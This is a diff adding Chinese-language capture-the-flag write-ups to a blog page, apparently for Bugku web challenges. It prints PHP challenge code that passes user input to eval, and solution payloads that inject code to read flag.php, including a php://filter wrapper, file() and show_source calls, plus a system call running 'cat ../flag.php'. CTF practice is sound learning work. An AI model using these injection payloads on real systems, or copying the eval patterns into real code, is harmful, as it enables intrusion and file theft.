@@ -82,6 +82,38 @@
 <blockquote>
 <p>{“f”:”system”,”d”:”cat ..\/flag.php”}</p>
 </blockquote>
+<h3 id="bugku-系列"><a href="#bugku-系列" class="headerlink" title="bugku 系列"></a>bugku 系列</h3><h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><blockquote>
+<p><a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php</a></p>
+</blockquote>
+<ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123; <span class="comment">//正则匹配=&gt; /^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>); <span class="comment">// 执行命令代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>分析php的9大内置变量</p>
+<blockquote>
+<p>$_POST [用于接收post提交的数据]<br>$_GET [用于获取url地址栏的参数数据]<br>$_FILES [用于文件就收的处理img 最常见]<br>$_COOKIE [用于获取与setCookie()中的name 值]<br>$_SESSION [用于存储session的值或获取session中的值]<br>$_REQUEST [具有get,post的功能，但比较慢]<br>$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都<br>$GLOBALS [一个包含了所有全局变量的数组]<br>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p>
+</blockquote>
+<p>得出令  args=GLOBALS  获得flag</p>
+<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>套路比较多，内容丰富，值得记录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>];  <span class="comment">// 获取hello参数</span></span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);  <span class="comment">// var_dump()输出文件信息，需要绕过</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>套路一 直接闭合var_dump </p>
+<blockquote>
+<p>hello=1);show_source(%27flag.php%27);var_dump(3<br><a href="http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)" target="_blank" rel="noopener">http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)</a></p>
+</blockquote>
+</li>
+<li><p>套路二 利用伪协议<br>直接使用post来使用伪协议</p>
+<blockquote>
+<p><a href="http://120.24.86.145:8003/index.php?hello=1);include" target="_blank" rel="noopener">http://120.24.86.145:8003/index.php?hello=1);include</a> $_POST[‘f’];//<br>在POST区域：f=php://filter/convert.base64-encode/resource=flag.php</p>
+</blockquote>
+</li>
+<li><p>套路三 直接来</p>
+<blockquote>
+<p>?hello=get_file_contents(‘flag.php’)<br>?hello=file(‘flag.php’)</p>
+</blockquote>
+</li>
+</ol>
+<p>总之是字符串拼接玩出了花·····emm</p>
 </the>
       
     </div>
